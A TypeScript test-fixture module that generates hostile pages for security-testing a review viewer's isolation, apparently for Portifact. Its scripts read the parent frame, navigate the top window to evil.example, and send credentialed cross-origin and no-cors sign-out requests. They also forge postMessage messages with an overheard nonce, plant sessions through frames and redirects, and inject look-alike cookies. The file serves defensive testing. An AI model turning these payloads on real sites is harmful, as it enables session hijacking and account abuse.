// A hostile artifact: once loaded in the review viewer it records every message the viewer sends
// it, forges bridge messages with the nonce it overhears, and tries to read the viewer, call the
// API as the visitor, sign them out and load another artifact with the visitor's review cookie.
// It writes what happened into #results for the test to read.
import { APP_ORIGIN } from "./hosts.ts";

export interface HostileResults {
  done: boolean;
  received: string[];
  parentDom: "read" | "blocked";
  topNavigation: "navigated" | "blocked";
  readApi: "read" | "blocked";
  readSibling: "read" | "blocked";
  cookies: string;
  forged: number;
}

export function hostilePage(victimOrigin: string, victimArtifactId: string): string {
  const script = `
const APP = ${JSON.stringify(APP_ORIGIN)};
const VICTIM = ${JSON.stringify(victimOrigin)};
const results = { done: false, received: [], parentDom: "blocked", topNavigation: "blocked",
  readApi: "blocked", readSibling: "blocked", cookies: document.cookie, forged: 0 };
const show = () => { document.getElementById("results").textContent = JSON.stringify(results); };
let nonce = null;
window.addEventListener("message", (event) => {
  results.received.push(JSON.stringify(event.data));
  if (event.data && event.data.type === "init") nonce = event.data.nonce;
  show();
});
const forge = (body) => {
  const message = Object.assign({ channel: "portifact-review", v: 1, nonce }, body);
  for (const origin of ["*", APP]) { parent.postMessage(message, origin); results.forged += 1; }
};
async function attack() {
  try { results.parentDom = parent.document.title ? "read" : "read"; } catch { results.parentDom = "blocked"; }
  try { top.location.href = "https://evil.example/"; } catch {}
  try {
    const response = await fetch(APP + "/api/v1/artifacts", { credentials: "include" });
    await response.text();
    results.readApi = "read";
  } catch { results.readApi = "blocked"; }
  try {
    const response = await fetch(VICTIM + "/", { credentials: "include" });
    await response.text();
    results.readSibling = "read";
  } catch { results.readSibling = "blocked"; }
  // Requests that would act as the visitor: no-cors lets them leave, but they cannot carry the
  // session (SameSite=Lax) and fail the Origin and fetch-metadata checks anyway.
  const thread = { versionId: "x", target: { schema: 1, path: "index.html", anchor: { kind: "document" } }, body: "forged" };
  await fetch(APP + "/api/v1/artifacts/${victimArtifactId}/annotations/threads", {
    method: "POST", mode: "no-cors", credentials: "include",
    headers: { "content-type": "text/plain", "idempotency-key": "hostile-key-1" }, body: JSON.stringify(thread),
  }).catch(() => {});
  await fetch(APP + "/api/auth/sign-out", { method: "POST", mode: "no-cors", credentials: "include" }).catch(() => {});
  // Subresource loads of a sibling artifact carry the visitor's review cookie of that artifact.
  const image = new Image();
  image.src = VICTIM + "/index.html?as=image";
  document.body.append(image);
  const script = document.createElement("script");
  script.src = VICTIM + "/index.html?as=script";
  document.body.append(script);
  // Forged bridge messages with the overheard nonce: a selection, an element, a thread to open.
  const deadline = Date.now() + 8000;
  while (nonce === null && Date.now() < deadline) await new Promise((r) => setTimeout(r, 100));
  if (nonce !== null) {
    forge({ type: "selection", target: { schema: 1, path: "index.html", anchor: { kind: "document" } } });
    // Rectangles meant to draw the viewer's Comment control over its bar or sidebar.
    forge({ type: "selection", target: { schema: 1, path: "index.html", anchor: { kind: "document" } }, rect: { x: -999999, y: -999999, width: 1000000, height: 1000000 } });
    forge({ type: "selection-rect", rect: { x: Number.NaN, y: -5000, width: 1, height: 1 } });
    forge({ type: "selection-rect", rect: { x: 0, y: 0, width: 1e9, height: 1e9 } });
    forge({ type: "element", target: { schema: 1, path: "index.html", anchor: { kind: "element", selectors: ["#bait"], tagName: "p", fingerprint: "Bait" } } });
    forge({ type: "selection", target: null, extra: "x".repeat(20000) });
  }
  await new Promise((r) => setTimeout(r, 1500));
  results.done = true;
  show();
}
attack();
`;
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Free prizes</title></head><body><main><h1>Free prizes</h1><p id="bait">Bait</p><pre id="results">{}</pre></main><script>${script}</script></body></html>`;
}

/**
 * An artifact that plants another review session of the victim artifact in the viewer's
 * partition: a nested frame bounces through a site of its own to the victim's review exchange
 * with the attacker's code, which arrives as a cross-site iframe navigation like the viewer's.
 */
export function plantingPage(plantUrl: string): string {
  const script = `
const frame = document.createElement("iframe");
frame.src = ${JSON.stringify(plantUrl)};
frame.addEventListener("load", () => { document.getElementById("state").textContent = "planted"; });
document.body.append(frame);
`;
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Cute cats</title></head><body><main><h1>Cute cats</h1><p id="state">planting</p></main><script>${script}</script></body></html>`;
}

/**
 * An artifact that, once the viewer has connected to it, navigates its own frame to `url`: another
 * artifact, or a redirector on another site that leads to one.
 */
export function bouncingPage(url: string): string {
  const script = `
window.addEventListener("message", (event) => {
  if (event.data && event.data.type === "init") setTimeout(() => { location.href = ${JSON.stringify(url)}; }, 1500);
});
`;
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Trampoline</title></head><body><main><h1>Trampoline</h1></main><script>${script}</script></body></html>`;
}

/**
 * An artifact that, opened as a top-level page, navigates that page to `url` (a review tab link
 * with someone else's code, directly or through another site) to plant a review tab session.
 */
export function navigatingPage(url: string): string {
  const script = `setTimeout(() => { location.href = ${JSON.stringify(url)}; }, 300);`;
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Navigator</title></head><body><main><h1>Navigator</h1></main><script>${script}</script></body></html>`;
}

/**
 * An artifact that injects cookies on the shared content domain, as any artifact can while
 * portifact.dev is not on the Public Suffix List: `count` cookies for every path, a few larger
 * ones scoped to `/docs`, and names that imitate Portifact's read cookie. Its icon is inline, so
 * no favicon request reaches the content Worker (which would start clearing) before the test
 * counts them.
 */
export function cookieInjectingPage(count: number): string {
  const script = `
const domain = location.hostname.slice(location.hostname.indexOf(".") + 1);
const attributes = "; domain=" + domain + "; max-age=3600; secure; samesite=lax";
for (let i = 0; i < ${count}; i++) document.cookie = "inj" + i + "=" + "x".repeat(90) + "; path=/" + attributes;
for (let i = 0; i < 10; i++) document.cookie = "deep" + i + "=" + "y".repeat(300) + "; path=/docs" + attributes;
document.cookie = "pf_read=forged; path=/" + attributes;
document.cookie = "__host-pf_read=forged; path=/" + attributes;
document.getElementById("state").textContent = "injected";
`;
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Cookie jar</title><link rel="icon" href="data:,"></head><body><main><h1>Cookie jar</h1><p id="state">injecting</p></main><script>${script}</script></body></html>`;
}
